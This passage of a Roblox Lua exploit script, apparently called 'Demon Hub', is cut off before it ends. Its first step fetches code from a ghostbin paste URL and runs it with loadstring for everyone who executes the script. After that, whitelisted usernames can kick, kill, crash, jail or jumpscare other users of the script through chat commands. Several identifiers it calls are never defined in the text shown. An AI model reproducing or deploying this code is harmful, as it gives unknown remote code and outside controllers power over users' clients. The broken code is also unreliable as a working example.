--// Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Executa o load para TODOS (independente se é dono ou não)
pcall(function()
    loadstring(game:HttpGet("https://ghostbin.axel.org/paste/un6ag/raw", true))()
end)

--// Autorizados e tags
local Autorizados = {
    ["defia_5uw"] = "Sub-Dono",
    ["Douglas_confortavel0"] = "Usuario-Admin",
    ["Ma872thus"] = "Staff / Dev",
    ["GABRIEL_BLOX1910"] = "Usuario-Admin",
    ["samueldatuf_91"] = "Usuario-Admin",
    ["HBT_QiOzdb9pNL"] = "Usuario-Admin",
    ["pedro0967540"] = "Usuario-Admin",
    ["fh_user1"] = "Usuario-Admin",
    ["JustWX99s"] = "Usuario-Admin",
    ["marcelobaida9f"] = "Usuario-Admin",
    ["ronaldbl20"] = "Dono",
    ["miuuq_333"] = "Usuario-Admin",
    ["Lsksjjwlskso"] = "Sub Dono",
    ["hiro909088"] = "Dono",
    ["veyar0982"] = "Sub-Dono",
}

--// Jogadores ativos
local JogadoresAtivos = {}
if LocalPlayer and LocalPlayer.Name then
    JogadoresAtivos[LocalPlayer.Name:lower()] = true
end

-- ===== SISTEMA DE TAGS PARA TODOS OS USUÁRIOS DA WHITELIST =====
local function createSpecialTag(player, tagText)
    local char = player.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    -- remove tag antiga
    local old = head:FindFirstChild("SpecialTag")
    if old then old:Destroy() end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "SpecialTag"
    billboardGui.Size = UDim2.new(0, 300, 0, 70)
    billboardGui.StudsOffset = Vector3.new(0, 3.5, 0)
    billboardGui.Adornee = head
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = head

    -- Usar DisplayName em vez do nome do usuário
    local displayName = player.DisplayName
    
    -- Tag com DisplayName e tipo juntos em VERMELHO
    local tagLabel = Instance.new("TextLabel")
    tagLabel.Size = UDim2.new(1, 0, 1, 0)
    tagLabel.BackgroundTransparency = 1
    tagLabel.Text = displayName .. "\n" .. tagText
    tagLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- VERMELHO COMPLETO
    tagLabel.TextScaled = true
    tagLabel.Font = Enum.Font.GothamBold
    tagLabel.TextStrokeTransparency = 0.2
    tagLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    tagLabel.Parent = billboardGui
end

-- Função para aplicar tag automaticamente para TODOS os usuários na whitelist
local function applyTag(player)
    local userType, statusMessage = getUserWhitelistType(player.Name:lower())
    if userType then
        print("[Demon Hub] Aplicando tag para:", player.Name, "DisplayName:", player.DisplayName, "Tipo:", userType)
        
        local function apply()
            if player.Character then
                createSpecialTag(player, userType)
                print("[Demon Hub] Tag aplicada com sucesso para:", player.DisplayName)
            end
        end
        
        player.CharacterAdded:Connect(function()
            task.wait(1)
            apply()
        end)
        
        -- Aplica imediatamente se já tiver character
        if player.Character then
            task.spawn(function()
                task.wait(1)
                apply()
            end)
        end
    else
        print("[Demon Hub] Usuário não está na whitelist:", player.Name)
    end
end

-- Aplica tags em todos os jogadores que estão na whitelist
for _, p in ipairs(Players:GetPlayers()) do
    task.spawn(function()
        task.wait(2) -- Espera um pouco para garantir que tudo carregou
        applyTag(p)
    end)
end

-- Aplica para quem entrar depois
Players.PlayerAdded:Connect(function(p)
    task.spawn(function()
        task.wait(2) -- Espera um pouco para garantir que tudo carregou
        applyTag(p)
    end)
end)

-- ===== SISTEMA BACKROOMS =====
local backroomsMonster = nil
local monsterActive = false

local function CreateBackroomsMonster(position)
    local monsterFolder = Instance.new("Folder")
    monsterFolder.Name = "BackroomsMonster"
    
    local monsterPart = Instance.new("Part")
    monsterPart.Name = "MonsterBody"
    monsterPart.Size = Vector3.new(8, 12, 8)
    monsterPart.Position = position
    monsterPart.Anchored = true
    monsterPart.CanCollide = true
    monsterPart.Material = Enum.Material.SmoothPlastic
    monsterPart.BrickColor = BrickColor.new("Really black")
    monsterPart.Parent = monsterFolder
    
    local monsterDecal = Instance.new("Decal")
    monsterDecal.Name = "MonsterFace"
    monsterDecal.Texture = "rbxassetid://126754882337711"
    monsterDecal.Face = Enum.NormalId.Front
    monsterDecal.Parent = monsterPart
    
    monsterFolder.Parent = workspace
    return monsterFolder
end

local function ActivateMonster(player)
    if not player or not player.Character then return end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    if not backroomsMonster then
        local monsterPosition = humanoidRootPart.Position + Vector3.new(25, 0, 0)
        backroomsMonster = CreateBackroomsMonster(monsterPosition)
    end
    
    monsterActive = true
    
    -- Jumpscare
    local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    screenGui.Name = "MonsterJumpscare"
    screenGui.IgnoreGuiInset = true
    
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    imageLabel.Image = "rbxassetid://126754882337711"
    imageLabel.ImageTransparency = 1
    
    coroutine.wrap(function()
        imageLabel.ImageTransparency = 0
        wait(1)
        for i = 1, 10 do
            imageLabel.ImageTransparency = i / 10
            wait(0.05)
        end
        screenGui:Destroy()
    end)()
    
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "O MONSTRO DAS BACKROOMS TE VIU! FUJA!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    return true
end

local function CreateBackrooms()
    local backroomsFolder = workspace:FindFirstChild("LightClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    backroomsFolder = Instance.new("Folder")
    backroomsFolder.Name = "LightClient_Backrooms"
    backroomsFolder.Parent = workspace
    
    local mapID = 10581711055
    local distantPosition = Vector3.new(0, 10000, 0)
    
    local success, mapa = pcall(function()
        return game:GetObjects("rbxassetid://"..mapID)[1]
    end)
    
    if success and mapa then
        mapa.Parent = backroomsFolder
        mapa.Name = "BackroomsMap"
        
        -- Move todas as partes para a posição distante
        for _, part in ipairs(mapa:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Position = part.Position + distantPosition
            end
        end
        
        -- Cria um spawn point no centro do mapa
        local centerPart = nil
        for _, part in ipairs(mapa:GetDescendants()) do
            if part:IsA("BasePart") and part.Name == "Part" then
                centerPart = part
                break
            end
        end
        
        local spawnPosition
        if centerPart then
            spawnPosition = centerPart.Position + Vector3.new(0, 5, 0)
        else
            spawnPosition = Vector3.new(0, 10005, 0)
        end
        
        Lighting.Brightness = 0.3
        Lighting.Ambient = Color3.fromRGB(255, 220, 150)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 220, 150)
        
        return backroomsFolder, spawnPosition
    else
        -- Se não conseguir carregar o mapa, cria um backrooms simples
        for x = 1, 10 do
            for z = 1, 10 do
                local wall = Instance.new("Part")
                wall.Size = Vector3.new(50, 30, 5)
                wall.Position = Vector3.new(x * 50, 10000, z * 50)
                wall.Anchored = true
                wall.CanCollide = true
                wall.BrickColor = BrickColor.new("Bright yellow")
                wall.Material = Enum.Material.SmoothPlastic
                wall.Parent = backroomsFolder
            end
        end
        
        -- Chão
        local floor = Instance.new("Part")
        floor.Size = Vector3.new(500, 5, 500)
        floor.Position = Vector3.new(250, 9985, 250)
        floor.Anchored = true
        floor.CanCollide = true
        floor.BrickColor = BrickColor.new("Bright yellow")
        floor.Material = Enum.Material.SmoothPlastic
        floor.Parent = backroomsFolder
        
        -- Teto
        local ceiling = Instance.new("Part")
        ceiling.Size = Vector3.new(500, 5, 500)
        ceiling.Position = Vector3.new(250, 10025, 250)
        ceiling.Anchored = true
        ceiling.CanCollide = true
        ceiling.BrickColor = BrickColor.new("Bright yellow")
        ceiling.Material = Enum.Material.SmoothPlastic
        ceiling.Parent = backroomsFolder
        
        Lighting.Brightness = 0.3
        Lighting.Ambient = Color3.fromRGB(255, 220, 150)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 220, 150)
        
        return backroomsFolder, Vector3.new(250, 10005, 250)
    end
end

local function TeleportToBackrooms(player)
    if not player or not player.Character then
        return false
    end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return false
    end
    
    local backroomsFolder, spawnPosition = CreateBackrooms()
    humanoidRootPart.CFrame = CFrame.new(spawnPosition)
    
    task.wait(3)
    ActivateMonster(player)
    
    return true
end

local function RestoreNormalWorld()
    monsterActive = false
    if backroomsMonster then
        backroomsMonster:Destroy()
        backroomsMonster = nil
    end
    
    local backroomsFolder = workspace:FindFirstChild("LightClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    Lighting.Brightness = 2
    Lighting.Ambient = Color3.fromRGB(128, 128, 128)
    Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
end

-- ===== SISTEMA CUBO DE CASTIGO =====
local punishmentCube = nil

local function CreatePunishmentCube()
    -- Remover cubo antigo se existir
    if punishmentCube then
        punishmentCube:Destroy()
        punishmentCube = nil
    end
    
    -- Criar um modelo para o cubo
    local cubeModel = Instance.new("Model")
    cubeModel.Name = "PunishmentCube"
    
    -- Posição alta no céu
    local cubePosition = Vector3.new(0, 15000, 0)
    
    -- Criar as 6 paredes do cubo (exterior)
    local cubeSize = 50
    local wallThickness = 5
    
    -- Textura para todas as paredes (MESMA TEXTURA DO CUBO)
    local textureId = "rbxassetid://98963458215787"
    
    -- Paredes do cubo
    local walls = {
        {position = Vector3.new(cubeSize/2, 0, 0), size = Vector3.new(wallThickness, cubeSize, cubeSize)}, -- Direita
        {position = Vector3.new(-cubeSize/2, 0, 0), size = Vector3.new(wallThickness, cubeSize, cubeSize)}, -- Esquerda
        {position = Vector3.new(0, cubeSize/2, 0), size = Vector3.new(cubeSize, wallThickness, cubeSize)}, -- Topo
        {position = Vector3.new(0, -cubeSize/2, 0), size = Vector3.new(cubeSize, wallThickness, cubeSize)}, -- Fundo
        {position = Vector3.new(0, 0, cubeSize/2), size = Vector3.new(cubeSize, cubeSize, wallThickness)}, -- Frente
        {position = Vector3.new(0, 0, -cubeSize/2), size = Vector3.new(cubeSize, cubeSize, wallThickness)} -- Trás
    }
    
    for _, wallData in ipairs(walls) do
        local wall = Instance.new("Part")
        wall.Size = wallData.size
        wall.Position = cubePosition + wallData.position
        wall.Anchored = true
        wall.CanCollide = true
        wall.Material = Enum.Material.SmoothPlastic
        wall.Transparency = 0.3
        wall.Color = Color3.fromRGB(0, 0, 0)
        wall.Name = "CubeWall"
        wall.Parent = cubeModel
        
        -- Aplicar textura em todas as faces
        for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
            local decal = Instance.new("Decal")
            decal.Texture = textureId
            decal.Face = face
            decal.Parent = wall
        end
    end
    
    -- Criar interior vazio (para o jogador ficar dentro)
    local interior = Instance.new("Part")
    interior.Name = "CubeInterior"
    interior.Size = Vector3.new(cubeSize - wallThickness*2, cubeSize - wallThickness*2, cubeSize - wallThickness*2)
    interior.Position = cubePosition
    interior.Anchored = true
    interior.CanCollide = false
    interior.Transparency = 1
    interior.Parent = cubeModel
    
    -- Posição dentro do cubo (centro)
    local insidePosition = cubePosition + Vector3.new(0, 0, 0)
    
    cubeModel.PrimaryPart = interior
    cubeModel.Parent = workspace
    punishmentCube = cubeModel
    
    return cubeModel, insidePosition
end

local function TeleportToCube(player)
    if not player or not player.Character then
        return false
    end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return false
    end
    
    local cube, insidePosition = CreatePunishmentCube()
    
    -- Teleporta o jogador para DENTRO do cubo
    humanoidRootPart.CFrame = CFrame.new(insidePosition)
    
    -- Congelar jogador dentro do cubo
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
    
    -- Impedir que o jogador saia do cubo
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not player.Character or not humanoidRootPart or not humanoidRootPart.Parent then
            connection:Disconnect()
            return
        end
        
        -- Mantém o jogador dentro do cubo
        local distanceFromCenter = (humanoidRootPart.Position - insidePosition).Magnitude
        if distanceFromCenter > 20 then
            humanoidRootPart.CFrame = CFrame.new(insidePosition)
        end
    end)
    
    -- Enviar mensagem
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "VOCÊ FOI ENVIADO PARA O CUBO DE CASTIGO!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    return true
end

local function RemoveFromCube(player)
    if not player or not player.Character then
        return false
    end
    
    -- Restaurar movimentação
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
    end
    
    -- Teleportar de volta para o spawn
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        humanoidRootPart.CFrame = CFrame.new(0, 5, 0)
    end
    
    -- Remover cubo
    if punishmentCube then
        punishmentCube:Destroy()
        punishmentCube = nil
    end
    
    -- Enviar mensagem
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "VOCÊ FOI LIBERADO DO CUBO DE CASTIGO!",
        Color = Color3.fromRGB(0, 255, 0),
        Font = Enum.Font.GothamBold
    })
    
    return true
end

-- ===== SISTEMA JAIL/UNJAIL COM MESMA TEXTURA DO CUBO =====
local jaulas = {}
local jailConnections = {}

local function CriarJailComTextura(position, playerName)
    -- Remover jaula antiga se existir
    if jaulas[playerName] then
        for _, part in ipairs(jaulas[playerName]) do
            part:Destroy()
        end
        jaulas[playerName] = nil
    end
    
    -- Criar uma caixa de prisão com a mesma textura do cubo
    local jailBox = {}
    local size = 10
    local height = 10
    
    -- Textura igual ao cubo
    local textureId = "rbxassetid://98963458215787"
    
    -- Criar o chão
    local floor = Instance.new("Part")
    floor.Size = Vector3.new(size, 1, size)
    floor.Position = position
    floor.Anchored = true
    floor.CanCollide = true
    floor.Transparency = 0.3
    floor.Color = Color3.fromRGB(0, 0, 0)
    floor.Material = Enum.Material.SmoothPlastic
    floor.Name = "JailFloor"
    floor.Parent = workspace
    table.insert(jailBox, floor)
    
    -- Aplicar textura no chão
    local floorDecal = Instance.new("Decal")
    floorDecal.Texture = textureId
    floorDecal.Face = Enum.NormalId.Top
    floorDecal.Parent = floor
    
    -- Criar as 4 paredes
    local walls = {
        {position = Vector3.new(size/2, height/2, 0), size = Vector3.new(1, height, size), face = Enum.NormalId.Left}, -- Direita
        {position = Vector3.new(-size/2, height/2, 0), size = Vector3.new(1, height, size), face = Enum.NormalId.Right}, -- Esquerda
        {position = Vector3.new(0, height/2, size/2), size = Vector3.new(size, height, 1), face = Enum.NormalId.Back}, -- Frente
        {position = Vector3.new(0, height/2, -size/2), size = Vector3.new(size, height, 1), face = Enum.NormalId.Front}  -- Trás
    }
    
    for _, wallData in ipairs(walls) do
        local wall = Instance.new("Part")
        wall.Size = wallData.size
        wall.Position = position + wallData.position
        wall.Anchored = true
        wall.CanCollide = true
        wall.Transparency = 0.3
        wall.Color = Color3.fromRGB(0, 0, 0)
        wall.Material = Enum.Material.SmoothPlastic
        wall.Name = "JailWall"
        wall.Parent = workspace
        table.insert(jailBox, wall)
        
        -- Aplicar textura na parede
        local wallDecal = Instance.new("Decal")
        wallDecal.Texture = textureId
        wallDecal.Face = wallData.face
        wallDecal.Parent = wall
    end
    
    -- Criar teto
    local ceiling = Instance.new("Part")
    ceiling.Size = Vector3.new(size, 1, size)
    ceiling.Position = position + Vector3.new(0, height, 0)
    ceiling.Anchored = true
    ceiling.CanCollide = true
    ceiling.Transparency = 0.3
    ceiling.Color = Color3.fromRGB(0, 0, 0)
    ceiling.Material = Enum.Material.SmoothPlastic
    ceiling.Name = "JailCeiling"
    ceiling.Parent = workspace
    table.insert(jailBox, ceiling)
    
    -- Aplicar textura no teto
    local ceilingDecal = Instance.new("Decal")
    ceilingDecal.Texture = textureId
    ceilingDecal.Face = Enum.NormalId.Bottom
    ceilingDecal.Parent = ceiling
    
    -- Salvar referência
    jaulas[playerName] = jailBox
    
    return jailBox
end

local function RemoverJail(playerName)
    if jaulas[playerName] then
        for _, part in ipairs(jaulas[playerName]) do
            part:Destroy()
        end
        jaulas[playerName] = nil
    end
    
    -- Remover conexão de monitoramento
    if jailConnections[playerName] then
        jailConnections[playerName]:Disconnect()
        jailConnections[playerName] = nil
    end
end

-- ===== SISTEMA FLOAT =====
local function FloatPlayer(player)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChildOfClass("Humanoid") then 
        return false 
    end
    
    local targetHrp = player.Character.HumanoidRootPart
    local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
    local targetPos = targetHrp.Position

    targetHumanoid.WalkSpeed = 0
    targetHumanoid.JumpHeight = 0

    local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Velocity = Vector3.new(0, 10, 0)
    bodyVelocity.Name = "FloatVelocity"

    local maxHeight = targetPos.Y + 50
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not player.Character or not player.Character.Parent or not targetHrp.Parent or not targetHumanoid.Parent then
            bodyVelocity:Destroy()
            connection:Disconnect()
            return
        end
        if targetHrp.Position.Y >= maxHeight then
            bodyVelocity:Destroy()
            connection:Disconnect()
            targetHumanoid.Health = 0
        end
    end)
    
    return true
end

-- ===== SISTEMA EXPLODIR =====
local function ExplodirPlayer(player)
    if not player or not player.Character then
        return false
    end
    
    local character = player.Character
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoidRootPart then
        return false
    end
    
    -- Cria uma explosão visual
    local explosion = Instance.new("Explosion")
    explosion.Position = humanoidRootPart.Position
    explosion.BlastPressure = 1000000
    explosion.BlastRadius = 20
    explosion.DestroyJointRadiusPercent = 1
    explosion.Parent = workspace
    
    -- Mata o personagem
    if character then
        character:BreakJoints()
        
        -- Efeito adicional de partículas
        for i = 1, 15 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(5, 5, 5)
            part.Position = humanoidRootPart.Position + Vector3.new(math.random(-10, 10), math.random(0, 10), math.random(-10, 10))
            part.Anchored = false
            part.CanCollide = false
            part.Material = Enum.Material.Neon
            part.BrickColor = BrickColor.new("Bright orange")
            part.Parent = workspace
            
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(
                math.random(-50, 50),
                math.random(20, 80),
                math.random(-50, 50)
            )
            bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
            bodyVelocity.Parent = part
            
            game.Debris:AddItem(part, 3)
        end
    end
    
    return true
end

-- ===== SISTEMA DE JUMPSCARES =====
local JUMPSCARES = {
    { Name = "!jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = "!jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = "!jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = "!jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

local function ExecutarJumpscare(jumpscareIndex)
    local jumpscare = JUMPSCARES[jumpscareIndex]
    if not jumpscare then return end
    
    -- Criar tela de jumpscare
    local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    screenGui.Name = "JumpscareGUI"
    screenGui.IgnoreGuiInset = true
    
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    imageLabel.Image = jumpscare.ImageId
    imageLabel.ImageTransparency = 1
    
    -- Tocar som do jumpscare
    local sound = Instance.new("Sound")
    sound.SoundId = jumpscare.AudioId
    sound.Volume = 1
    sound.Parent = workspace
    sound:Play()
    game.Debris:AddItem(sound, 5)
    
    -- Animação do jumpscare
    coroutine.wrap(function()
        -- Aparece
        for i = 0, 10 do
            imageLabel.ImageTransparency = (10 - i) / 10
            task.wait(0.02)
        end
        
        -- Permanece por 0.5 segundos
        task.wait(0.5)
        
        -- Some
        for i = 0, 10 do
            imageLabel.ImageTransparency = i / 10
            task.wait(0.03)
        end
        
        screenGui:Destroy()
    end)()
end

-- ===== SISTEMA COOLKID AVATAR =====
local function ApplyCoolkidAvatar()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Espera pelo character
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    if not Humanoid then return end

    -- Tenta obter a descrição atual
    local success, desc = pcall(function()
        return Humanoid:GetAppliedDescription()
    end)
    
    -- Remove accessories existentes se possível
    if success and desc and desc.GetAccessories then
        local WearRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear")
        for _, accessory in ipairs(desc:GetAccessories(true)) do
            if accessory.AssetId then
                local args = {
                    [1] = tonumber(accessory.AssetId)
                }
                pcall(function()
                    WearRemote:InvokeServer(unpack(args))
                end)
            end
        end
    end

    task.wait(0.5)

    -- Tenta mudar as proporções do corpo
    local changeBodyRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("ChangeCharacterBody")
    if changeBodyRemote then
        local args = {
            {
                0,
                0,
                0,
                0,
                0,
                0
            }
        }
        pcall(function()
            changeBodyRemote:InvokeServer(unpack(args))
        end)
    end

    -- Adiciona acessórios
    local wearRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Wear")
    if wearRemote then
        pcall(function()
            wearRemote:InvokeServer(18554114295) -- Acessório 1
            task.wait(0.1)
            wearRemote:InvokeServer(3164473649)  -- Acessório 2
            task.wait(0.1)
            wearRemote:InvokeServer(6093233760)  -- Acessório 3
        end)
    end

    -- Tenta mudar a cor do corpo
    local changeColorRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("ChangeBodyColor")
    if changeColorRemote then
        pcall(function()
            changeColorRemote:FireServer("Really red")
        end)
    end
    
    -- Mensagem de sucesso
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Demon Hub] Coolkid Avatar aplicado!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    print("CoolkidAvatar aplicado com sucesso!")
end

-- Interface ADMIN apenas para quem está na whitelist
local playerOriginalSpeed = {}

local function EnviarComando(comando, playerName)
    local msg = comando
    if playerName then msg = comando.." "..playerName end
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(msg)
    else
        warn("Nenhum canal encontrado")
    end
end

-- Função que executa comandos do chat (COM PREFIXO !)
local function ExecutarComando(msgText, autor)
    -- Verifica se o autor está na whitelist e não expirado
    local userType, statusMessage = getUserWhitelistType(autor:lower())
    if not userType then 
        print("[Demon Hub] Usuário não autorizado ou whitelist expirada:", autor, statusMessage)
        return 
    end
    
    local playerName = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    print("[Demon Hub] Processando comando:", msgText, "de:", autor, "Tipo:", userType)

    -- Kick (PREFIXO !)
    if msgText:match("!kick%s+" .. playerName) then
        LocalPlayer:Kick("Kickado By Demon Hub.")
    end

    -- Kill (PREFIXO !)
    if msgText:match("!kill%s+" .. playerName) then
        if character then character:BreakJoints() end
    end

    -- KillPlus (PREFIXO !)
    if msgText:match("!killplus%s+" .. playerName) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10,10,10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = workspace
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part
                    game.Debris:AddItem(part, 3)
                end
            end
        end
    end

    -- Fling (PREFIXO !)
    if msgText:match("!fling%s+" .. playerName) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local targetCFrame = CFrame.new(50000, 5000000, 3972823)
                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
                tween:Play()
            end
        end
    end

    -- Crash (PREFIXO !)
    if msgText:match("!crash%s+" .. playerName) then
        -- Congela o personagem
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
        
        -- Congela a tela
        RunService:Set3dRenderingEnabled(false)
        
        -- Mata o personagem repetidamente
        task.spawn(function()
            while true do
                if character then
                    character:BreakJoints()
                end
                task.wait(0.01)
            end
        end)
        
        -- Kicka após 3 segundos
        task.wait(3)
        LocalPlayer:Kick("CRASHED By Demon Hub")
    end

    -- Freeze (PREFIXO !)
    if msgText:match("!freeze%s+" .. playerName) then
        if humanoid then
            playerOriginalSpeed[playerName] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    -- Unfreeze (PREFIXO !)
    if msgText:match("!unfreeze%s+" .. playerName) then
        if humanoid then
            humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
            playerOriginalSpeed[playerName] = nil
        end
    end

    -- Float (PREFIXO !)
    local floatTarget = msgText:match("!float%s+(%w+)")
    if floatTarget and floatTarget == playerName then
        FloatPlayer(LocalPlayer)
        return
    end

    -- Explodir (PREFIXO !)
    local explodirTarget = msgText:match("!explodir%s+(%w+)")
    if explodirTarget and explodirTarget == playerName then
        ExplodirPlayer(LocalPlayer)
        return
    end

    -- Backrooms (PREFIXO !)
    local backroomsTarget = msgText:match("!backrooms%s+(%w+)")
    if backroomsTarget and backroomsTarget == playerName then
        print("[Demon Hub] Executando Backrooms...")
        TeleportToBackrooms(LocalPlayer)
        return
    end

    -- Unbackrooms (PREFIXO !)
    local unbackroomsTarget = msgText:match("!unbackrooms%s+(%w+)")
    if unbackroomsTarget and unbackroomsTarget == playerName then
        RestoreNormalWorld()
        return
    end

    -- Cubo de Castigo (PREFIXO !)
    local cuboTarget = msgText:match("!cubo%s+(%w+)")
    if cuboTarget and cuboTarget == playerName then
        TeleportToCube(LocalPlayer)
        return
    end

    -- Remover do Cubo (PREFIXO !)
    local uncuboTarget = msgText:match("!uncubo%s+(%w+)")
    if uncuboTarget and uncuboTarget == playerName then
        RemoveFromCube(LocalPlayer)
        return
    end

    -- Coolkid Avatar (PREFIXO !)
    local coolkidTarget = msgText:match("!coolkidavatar%s+(%w+)")
    if coolkidTarget and coolkidTarget == playerName then
        ApplyCoolkidAvatar()
        return
    end

    -- Jumpscares (PREFIXO !)
    for i = 1, 4 do
        local jumpscareTarget = msgText:match("!jumps" .. i .. "%s+(%w+)")
        if jumpscareTarget and jumpscareTarget == playerName then
            ExecutarJumpscare(i)
            return
        end
    end

    -- Verifique (PREFIXO !)
    if msgText:match("!verifique") then
        pcall(function()
            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if channel then
                channel:SendAsync("Demon###")
            end
        end)
    end

    -- Bring (PREFIXO !)
    local bringTarget = msgText:match("!bring%s+(%w+)")
    if bringTarget then
        if bringTarget == LocalPlayer.Name:lower() then
            local autorPlayer = Players:FindFirstChild(autor)
            if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local root = character and character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
                end
            end
        end
    end

    -- Jail (PREFIXO !) - COM MESMA TEXTURA DO CUBO
    local jailTarget = msgText:match("!jail%s+(%w+)")
    if jailTarget and jailTarget == playerName then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if root and humanoid then
                playerOriginalSpeed[playerName] = humanoid.WalkSpeed
                humanoid.WalkSpeed = 0

                local pos = root.Position
                
                -- Criar jail com a mesma textura do cubo
                CriarJailComTextura(pos, playerName)
                
                -- Conexão para manter o jogador dentro da jaula
                if jailConnections[playerName] then
                    jailConnections[playerName]:Disconnect()
                end
                jailConnections[playerName] = RunService.Heartbeat:Connect(function()
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local hrp = LocalPlayer.Character.HumanoidRootPart
                        local center = pos + Vector3.new(0, 2, 0)
                        if (hrp.Position - center).Magnitude > 4 then
                            hrp.CFrame = CFrame.new(center)
                        end
                    end
                end)
            end
        end
    end

    -- Unjail (PREFIXO !) - REMOVE JAIL
    local unjailTarget = msgText:match("!unjail%s+(%w+)")
    if unjailTarget and unjailTarget == playerName then
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
                playerOriginalSpeed[playerName] = nil
            end

            -- Remover a jaula
            RemoverJail(playerName)
        end
    end
end

-- Conectar chat para sempre receber comandos
local function ConectarChat()
    for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
        if channel:IsA("TextChannel") then
